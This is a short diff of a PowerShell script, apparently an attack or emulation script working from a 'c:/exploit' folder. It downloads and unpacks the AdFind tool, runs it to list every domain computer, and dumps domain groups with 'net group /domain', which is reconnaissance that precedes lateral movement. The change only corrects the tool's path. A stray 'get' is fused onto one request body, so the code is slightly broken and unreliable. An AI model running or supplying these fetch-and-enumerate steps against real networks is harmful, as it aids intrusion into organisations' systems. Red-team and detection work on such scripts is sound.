@@ -36,7 +36,7 @@ Invoke-WebRequest -UseBasicParsing -Uri $adfindUrl `
 -ContentType "application/x-www-form-urlencoded" `
 -Body "download=AdFind.zip&email=&B1=Download+Now"get   -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $adfindPath
-./adfind/adfind.exe -f "objectcategory=computer" > c:/exploit/computers.txt
+c:/exploit/adfind/adfind.exe -f "objectcategory=computer" > c:/exploit/computers.txt
 
 "Checking up the domain"
 net group /domain > c:/exploit/group_domains.txt
